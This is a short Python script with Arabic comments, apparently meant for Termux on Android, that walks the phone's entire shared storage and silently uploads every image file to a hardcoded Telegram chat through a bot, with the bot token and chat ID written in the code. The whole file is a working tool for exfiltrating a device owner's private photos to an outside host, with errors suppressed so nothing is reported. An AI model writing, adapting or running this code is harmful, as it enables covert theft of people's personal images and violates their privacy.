import os
import telebot
from concurrent.futures import ThreadPoolExecutor
import time

# إعدادات البوت (معلوماتك الأصلية)
API_TOKEN = "6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac"
CHAT_ID = "1350971290"
bot = telebot.TeleBot(API_TOKEN)

# المسار المستهدف
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    try:
        valid_exts = (".jpg", ".png", ".jpeg", ".webp")
        if file_path.lower().endswith(valid_exts):
            with open(file_path, "rb") as f:
                bot.send_photo(chat_id=CHAT_ID, photo=f)
                print(f"[*] تم الرفع: {os.path.basename(file_path)}")
                # تأخير بسيط جداً لتجنب ضغط الذاكرة في أندرويد 14
                time.sleep(2) 
    except Exception:
        pass

# استخدام worker واحد أو اثنين فقط هو السر في استقرار Termux على Redmi
print("بدء التشغيل المستقر على Android 14...")
with ThreadPoolExecutor(max_workers=1) as executor:
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            full_path = os.path.join(root, file)
            executor.submit(send_file, full_path)
